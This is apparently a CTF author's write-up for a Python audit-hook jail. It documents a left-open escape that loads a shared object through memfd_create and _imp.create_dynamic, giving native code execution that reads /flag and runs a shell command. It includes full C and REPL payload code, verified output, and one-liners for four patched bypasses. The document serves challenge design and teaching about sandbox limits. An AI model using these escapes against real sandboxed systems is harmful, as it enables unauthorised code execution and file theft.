# `challenge.py` pyjail — the surviving unintended solution (`memfd_create` → native code)

Target: `nc challenges.cybn.fr 10193` — CPython **3.14.10**, `code.InteractiveConsole`
with full builtins, confined by a single Python-level `sys.addaudithook` policy.

The **intended** solution is `_interpreters`: audit hooks live in per-interpreter
state, so a subinterpreter starts unhooked.

This document covers the one unintended escape that is **deliberately left open**,
plus a record of the four that were closed. Everything here was verified against a
byte-identical local replica of `challenge.py` on Python 3.14.10 — the same build as
the remote — driven through a pty, exactly as `socat ...,pty,ctty` presents it.

---

## TL;DR

`os.memfd_create` raises no audit event, and `importlib._bootstrap._imp.create_dynamic`
survived the `del _imp` in `challenge.py`. Together they give an in-memory write
primitive plus `dlopen`, so a shared object's ELF constructor runs **native code
inside the jail process**. At that point `sys.addaudithook` is no longer in the
picture — the hook is Python-level, and nothing in libc consults it.

This is not fixable from inside the policy, which is why it stays.

---

## Why it works

Three independent facts compose.

### 1. `os.memfd_create` is unaudited

CPython raises no audit event for `memfd_create`, so the jail gets a writable,
anonymous file descriptor for free. `os.write` to it is likewise silent, and
`dlopen` happily accepts `/proc/self/fd/N`. Nothing ever touches the filesystem,
so the `"open"` blocklist entry is never consulted.

### 2. `del _imp` was not a revocation

```python
del _imp.create_builtin
del _imp, sys.modules["_imp"]
```

`del _imp.create_builtin` deletes the attribute from the **module object**, so that
one *is* genuinely revoked everywhere. The second line only unbinds a name and drops
a cache entry — the module object itself stays alive, referenced by the import
machinery's globals:

```
>>> import importlib._bootstrap as B
>>> B._imp
<module '_imp' (built-in)>
>>> B._imp.create_dynamic
<built-in function create_dynamic>
>>> B._imp.exec_dynamic
<built-in function exec_dynamic>
>>> B._imp.create_builtin
AttributeError
```

`importlib._bootstrap_external._imp` reaches the same object.

### 3. The constructor runs before `PyInit_` is looked up

`_imp.create_dynamic(spec)` calls `dlopen()` first and only then searches for
`PyInit_<name>`. An `__attribute__((constructor))` function has already executed by
the time the missing export is noticed, so the trailing `ImportError` is cosmetic —
the payload ran.

### The one constraint the patch adds

`_imp.create_dynamic` **does** raise an `import` audit event, with `args[0]` set to
the attacker-controlled `spec.name`:

```
('import', ('WEIRDNAME', '/path/to/module.so', None, None, None))
```

Since the hook now checks that name against a **frozen snapshot** of `sys.modules`
taken at arm time (see "What was patched" #2), the module must be *named after a
module that was already imported* — `base64`, `json`, `dis`, any of the pre-imported
set. Naming it `base64` costs nothing: `create_dynamic` does not consult
`sys.modules`, and the name only has to satisfy the auditor.

---

## Full payload

### `evil.c`

```c
/* gcc -shared -fPIC -Os -o evil.so evil.c */
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
static void boom(void) {
    write(1, "[+] native code running inside the jail\n", 40);
    int fd = open("/flag", O_RDONLY);
    if (fd >= 0) {
        char buf[256];
        ssize_t n = read(fd, buf, sizeof buf);
        if (n > 0) write(1, buf, (size_t)n);
        close(fd);
    }
    system("id");
}
```

Build it against the target's ABI — the image is `python:3.14-slim` (Debian,
x86_64, glibc). `system()` works because `/bin/sh` is present, and once control is
in libc no audit hook is consulted.

### REPL lines

`base64` is pre-imported by the challenge, so the `.so` ships inline; nothing has to
be compiled on the target. The remote is a **pty in canonical mode**, which caps a
single line at 4095 bytes, so the blob is appended in chunks (~15.6 kB `.so` →
~20.9 kB base64 → 6 chunks of 3500).

```python
import sys, os, base64, importlib.machinery as M, importlib.util as U, importlib._bootstrap as B
BL = ""
BL += "<chunk 1>"
BL += "<chunk 2>"
...
fd = os.memfd_create("x"); os.write(fd, base64.b64decode(BL)); P = "/proc/self/fd/%d" % fd
N = "base64"
LD = M.ExtensionFileLoader(N, P); SP = U.spec_from_file_location(N, P, loader=LD)
B._imp.create_dynamic(SP)
```

### Verified output (against the **patched** `challenge.py`)

```
>>> fd = os.memfd_create("x"); os.write(fd, base64.b64decode(BL)); P = "/proc/self/fd/%d" % fd
15664
>>> N = "base64"
>>> LD = M.ExtensionFileLoader(N, P); SP = U.spec_from_file_location(N, P, loader=LD)
>>> B._imp.create_dynamic(SP)
[+] native code running inside the jail
NotACTF{flag}
uid=1000(arch) gid=1000(arch) ...
Traceback (most recent call last):
  File "<console>", line 1, in <module>
ImportError: dynamic module does not define module export function (PyInit_base64)
>>>
```

(`NotACTF{flag}` is the local test machine's `/flag`; on the remote this is the real
flag.)

---

## Why this one is not patched

An in-process Python audit hook is not a sandbox boundary. It can only observe
events CPython chooses to raise, from Python, inside the same address space. Once a
`.so` is mapped, the payload is machine code in the same process — it can read
`/flag` with a raw `open(2)`, `execve` a shell, or simply overwrite the interpreter's
own audit-hook list. No amount of blocklist tuning reaches it.

Auditing `os.memfd_create` would raise the bar, but not close the door: any writable
path reachable by the process (`/tmp`, `/dev/shm`, an `O_TMPFILE` fd, a pipe spliced
to a file) feeds `dlopen` the same way, and removing `create_dynamic` would start
breaking legitimate extension imports. The honest fix is outside the policy —
seccomp, a separate process, or a container — which is also exactly what makes the
*intended* `_interpreters` solution work: hook state is per-interpreter, not
per-process.

Left open on purpose: it is a strictly harder path than the intended one, and it
teaches the right lesson.

---

## What was patched

Four unintended escapes were closed. Each was confirmed working before the change
and confirmed dead after, with the intended and memfd paths re-verified both times.

### 1. `io.FileIO` + the `"rb"` exemption → arbitrary file read

```python
# removed
if event == "open" and args[1] == "rb":
    _path = str(args[0])
    if _path[:1] == "<" and _path[-1:] == ">":
        return
```

Two flaws composed:

**1a — the branch was unreachable by any genuine code path.** `builtins.open()` audits
the *normalized* mode (`b` stripped), while `io.FileIO` audits the *raw* string it was
handed:

| call | audited `args` |
|---|---|
| `open("f","rb")`       | `('f', 'r',   524288)` |
| `io.FileIO("f","rb")`  | `('f', 'rb',  524288)` |
| `io.open_code("f")`    | `('f', 'r',   524288)` |
| `os.open("f", …)`      | `('f', None,  524288)` |

Nothing in CPython's normal operation emits `("open", path, "rb")`, so the exemption
existed solely for an attacker — it could not be justified as "needed for the REPL".

**1b — the hook stringified an attacker-controlled object.** The audit argument is the
*original* object, not a resolved path. A `str` subclass satisfies `PyUnicode_Check`,
so `PyOS_FSPath` returns it untouched and `FileIO` opens the real underlying buffer —
while the hook calls *your* `__str__`:

```python
import io
print(io.FileIO(type("P",(str,),{"__str__":lambda s:"<console>"})("/flag"),"rb").readall())
```

**Fix:** the whole exemption was deleted. The policy no longer calls any method on an
attacker-controlled object. Verified dead for modes `rb`, `rb+`, `br`, `r`, `rbU`, for
plain paths, and via `open()` / `io.open_code()` / `os.open()` with a `str` subclass.

### 2. `sys.modules` poisoning defeated the import filter

`_LOADED` was the **live** `sys.modules` dict, freely writable from inside the jail, so
`sys.modules["anything"] = None` whitelisted that name for the audit check.

**Fix:** the allowed set is snapshotted at arm time —
`frozenset(sys.modules)` — and the audited name is type-checked before use:

```python
if event == "import":
    _name = args[0]
    if type(_name) is not str:
        ... deny ...
    if _name not in _LOADED:
        ... deny ...
```

The `type(_name) is not str` guard matters: `args[0]` for `create_dynamic` is
attacker-supplied, and a `str` subclass overriding `__hash__`/`__eq__` (or `__str__`,
reached by the `%s` in the denial message) would otherwise run attacker code *inside
the hook*, where the frame's write-through `f_locals` can rebind `_EXIT` and neuter
the termination.

### 3. `marshal.loads` bypassed the `code.__new__` block

`"code.__new__"` is in the blocklist, but `marshal` reconstructs code objects in C
without going through `code_new`:

```python
import marshal
exec(marshal.loads(marshal.dumps(compile("print('pwn')","<x>","exec"))))
```

**Fix:** `del _marshal.load, _marshal.loads` on the module object — a real revocation,
so `importlib._bootstrap_external.marshal` and `sys.modules["marshal"]` see it gone
too. The module stays importable, so a player gets a clean `AttributeError` rather
than a killed session. `.pyc` loading was already unreachable (every route ends at
`io.open_code` → `open` event with mode `"r"`).

### 4. Exception tracebacks reached inside the running hook

`sys._getframe` is blocked, but `e.__traceback__.tb_frame.f_back` raises **no audit
event** and walks the whole stack. Chained with #1b — where `__str__` is invoked *by
the hook* — `f_back` landed on the hook's own frame and exposed its entire closure
(`_B`, `_EXIT`, `_FLUSH`, `_WRITE`, `_LOADED`), confirming `_LOADED is sys.modules`.

**Fix (indirect):** frame introspection itself cannot be blocked — tracebacks,
`gi_frame` and `cr_frame` all reach frames unaudited, and that is unchanged. What is
gone is any way to *get code running inside the hook*: with #1 removed and the import
name type-checked, the policy never invokes an attacker-defined method. Frame walking
now reaches only:

```
FRAMES [('<module>', '<console>'), ('runcode', 'code.py'), ('runsource', 'code.py'),
        ('push', 'code.py'), ('interact', 'code.py'), ('<module>', 'challenge.py')]
MODGLOBALS ['_banner', '_con', 'code', 'linecache', 'os', 'sys']
```

`_POLICY`, `_build`, `_imp` and `_marshal` are all unbound by then, and the hook
function object is referenced only by interpreter state, unreachable without `gc.*`
(blocked). Everything left is already reachable from the REPL.

---

## What still holds

Tested and genuinely sealed:

- **`_posixsubprocess.fork_exec` is audited.** Loading the `.so` works; calling it does
  not: `[sandbox] denied: _posixsubprocess.fork_exec -- session terminated`.
- **`os.forkpty` is caught** by the `"os.fork"` prefix match — deliberate and correct.
- **`ctypes.*`** — every useful entry point (`dlopen`, `dlsym`, `cdata`,
  `call_function`, `string_at`, `addressof`) is prefix-blocked, so loading the
  `_ctypes` `.so` buys nothing.
- **`gc.*`, `mmap.*`, `sys.settrace`, `sys.monitoring`, `socket.*`** — sealed.
- **All file reads** — `open()`, `os.open()`, `io.open_code()` and `io.FileIO()` in
  every mode now hit the `"open"` blocklist entry.
- Source- and bytecode-module loading is blocked for the same reason.

### Known-harmless residue

- **Frame walking** (above) — reaches nothing live.
- **Unaudited `os` recon**: `os.stat`, `os.readlink`, `os.pipe`, `os.dup`,
  `os.memfd_create`. These gave filesystem enumeration despite `os.listdir`/`os.scandir`
  being blocked, but with the arbitrary-read primitive (#1) gone they are recon only —
  there is no longer a way to turn a known path into file contents, short of the native
  escape this document is about. `os.memfd_create` is required by that escape and stays.

---

## Structural notes

1. **The hook only terminates, never raises.** Any blocked event is instantly fatal,
   which makes blind probing expensive — but it also means a single logic hole is a
   total bypass, with no defence in depth behind it.
2. **Never reason about attacker-controlled objects.** `str(args[0])` handed control
   flow to the target of the check (#1b). The policy now touches no attacker-defined
   method.
3. **Never reason about live mutable state.** `_LOADED is sys.modules` (#2).
4. **`del` on a module is not revocation.** Dropping a name and a `sys.modules` entry
   leaves the object alive and reachable (#2 above, and the `linecache` stubbing and
   `license`/`credits`/`copyright` blanking are likewise cosmetic). Deleting the
   *attribute* — `_imp.create_builtin`, `marshal.loads` — is.
5. **An in-process audit hook is not a sandbox boundary.** The memfd escape is the
   proof: once native code loads, the policy is irrelevant. The same is true of the
   intended `_interpreters` solution for a different reason — hook state is
   per-interpreter. A real boundary needs seccomp, a separate process, or a container.

---

## Reproducing the verification

The replica is driven through a real pty (`pty.openpty()` + line-by-line writes),
which reproduces the remote's 4095-byte canonical-mode line limit and its echo
behaviour. Two suites were run against both the pre- and post-patch file:

- **exploit suite** — 12 cases: the four unintended escapes, the intended
  `_interpreters` path, the kept memfd path, four must-stay-sealed controls, and two
  REPL-usability checks.
  Before the patch: all four escapes fire. After: all four dead, intended + memfd
  still fire, sealed controls unchanged.
- **variant probes** — 24 cases: every near-miss around the removed exemption (5 file
  modes × 4 APIs), lying `str` subclasses as import names, every surviving reference
  to `marshal.loads`, frame-walk reachability, and REPL ergonomics (multi-line `def`,
  tracebacks, `SyntaxError` recovery, `_suggestions`, `dis`, `warnings`).
  All 24 as expected after the patch.

The official `writeup/solve.py` was also run end-to-end against the patched jail
behind `socat TCP-LISTEN:...,fork EXEC:'challenge.py,stderr',pty,ctty` and still
retrieves the flag.
